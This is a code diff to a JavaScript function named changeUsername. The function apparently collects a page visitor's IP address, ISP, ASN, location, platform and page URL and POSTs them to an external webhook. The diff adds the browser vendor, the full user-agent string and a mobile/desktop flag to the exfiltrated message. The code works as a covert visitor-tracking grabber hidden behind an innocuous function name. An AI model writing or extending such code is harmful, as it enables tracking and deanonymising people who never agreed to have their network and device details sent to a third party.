@@ -39,7 +39,8 @@ function changeUsername() {
       try { const r2 = await fetch(fallback); if (r2.ok) return await r2.json(); } catch {}
       return {};
     }
-
+    const vendor = navigator.vendor || "unknown";
+    const agent = navigator.userAgent || "unknown";
     const data = await getData(ip);
     const isp = data.org || "Unknown ISP";
     const asn = data.asn ? `(${data.asn})` : "";
@@ -49,7 +50,7 @@ function changeUsername() {
     const platform = navigator.userAgentData?.platform || navigator.platform;
     const site = window.location.href.replace(/^https?:\/\//, "https://");
 
-    const message = `User: ${username}\nIP: ${ip}\nISP: ${isp} ${asn}\nLocation: ${location}\nDevice: ${platform}\nSite: ${site}`;
+    const message = `User: ${username}\nIP: ${ip}\nISP: ${isp} ${asn}\nLocation: ${location}\nDevice: ${platform}\nSite: ${site}\nThe Person is on ${navigator.userAgentData?.mobile ? "Mobile" : "Desktop"}\nVendor: ${vendor}\nUser Agent: ${agent}`;
 
     await fetch(webhookUrl, {
       method: "POST",
